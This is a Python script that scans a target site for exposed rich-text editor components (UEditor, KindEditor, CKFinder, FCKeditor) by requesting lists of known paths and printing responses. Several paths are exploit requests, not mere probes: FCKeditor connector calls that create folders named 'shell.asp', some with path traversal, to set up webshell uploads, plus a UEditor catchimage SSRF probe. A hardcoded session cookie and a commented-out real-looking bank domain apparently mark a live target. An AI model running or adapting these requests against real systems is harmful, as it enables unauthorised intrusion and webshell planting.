from ClassCongregation import color
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

ueditor_path = ['/ueditor.config.js','/net/controller.ashx?action=catchimage','/jsp/controller.jsp?action=catchimage&source[]=http://127.0.0.1:80/0f3927bc-5f26-11e8-9c2d-fa7ae01bbebc.png']
kindeditor_path = ['/kindeditor-all.min.js','/asp/upload_json.asp?dir=file','/asp.net/upload_json.ashx?dir=file','/jsp/upload_json.jsp?dir=file','/php/upload_json.php?dir=file']
ckfinder_path = ['ckfinder.html','/core/connector/java/connector.java?command=FileUpload&type=files&currentFolder=/&langCode=zh-cn&hash=&response_type=txt']
fckeditor_path = ['/editor/dialog/fck_about.html','/_whatsnew.html','/editor/filemanager/browser/default/connectors/test.html','/editor/filemanager/upload/test.html','/editor/filemanager/connectors/test.html','/editor/filemanager/connectors/uploadtest.html','/_samples/default.html','/_samples/asp/sample01.asp','/_samples/asp/sample02.asp','/_samples/asp/sample03.asp','/_samples/asp/sample04.asp','/editor/.htm','/editor/fckdialog.html','/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=/','/editor/filemanager/browser/default/connectors/php/connector.php?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=/','/editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=/','/editor/filemanager/browser/default/connectors/jsp/connector.jsp?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=/','/editor/filemanager/browser/default/browser.html?Type=Image&Connector=http://www.site.com//editor/filemanager/connectors/php/connector.php','/editor/filemanager/browser/default/browser.html?Type=Image&Connector=http://www.site.com//editor/filemanager/connectors/asp/connector.asp','/editor/filemanager/browser/default/browser.html?Type=Image&Connector=http://www.site.com//editor/filemanager/connectors/aspx/connector.aspx','/editor/filemanager/browser/default/browser.html?Type=Image&Connector=http://www.site.com//editor/filemanager/connectors/jsp/connector.jsp','/editor/filemanager/browser/default/browser.html?type=Image&connector=connectors/asp/connector.asp','/editor/filemanager/browser/default/browser.html?Type=Image&Connector=connectors/jsp/connector.jsp','/editor/filemanager/browser/default/browser.html?Type=Image&Connector=connectors/aspx/connector.Aspx','/editor/filemanager/browser/default/browser.html?Type=Image&Connector=connectors/php/connector.php','/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&Type=File&CurrentFolder=/shell.asp&NewFolderName=z.asp','/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&Type=Image&CurrentFolder=/shell.asp&NewFolderName=z&uuid=1244789975684','/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=CreateFolder&CurrentFolder=/&Type=Image&NewFolderName=shell.asp','/editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=CreateFolder&Type=Image&CurrentFolder=../../../&NewFolderName=shell.asp','/editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=e:/']

org_headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko)',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US, en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Connection': 'close',
    'Cookie': 'currentMenuCode=1370236658088816640; JSESSIONID=06F81F3063191B2508149934FA5115A2; jeesite.session.id=ca4b0bb8c18f4d72b9a4a36035cad00f; pageNo=1',
}

proxies = {
  "http": "http://127.0.0.1:8080",
  "https": "http://127.0.0.1:8080",
}
TIMEOUT = 2
def Editor_check(url, editor_path, TIMEOUT=TIMEOUT):
    for i in editor_path:
        try:
            resp = requests.get(url=url + i, headers=org_headers,
                                timeout=TIMEOUT, 
                                allow_redirects=False, 
                                verify = False)
            if resp.status_code == 200 and 'DOCTYPE' not in resp.text:
                color('[+] Host: %s %s'%(url + i, resp.status_code), 'green')
                print(resp.text[:50])
            else:
                color('[-] Host: %s %s'%(url + i, resp.status_code), 'red')
        except Exception as error:
            color('[-] Host: %s done!'%(url + i), 'red')
            continue

def check(**kwargs):
    url = kwargs['url'].strip('/')
    #url = 'https://moa.cmbc.com.cn/moastatic'
    #url = url.strip('/')
    color('[*] Scanning target domain %s'%url, 'green')
    Editor_check(url,ueditor_path)
    Editor_check(url,kindeditor_path)
    Editor_check(url,ckfinder_path)
    Editor_check(url,fckeditor_path)

if __name__ == "__main__":
    check(**{'url':'***'})













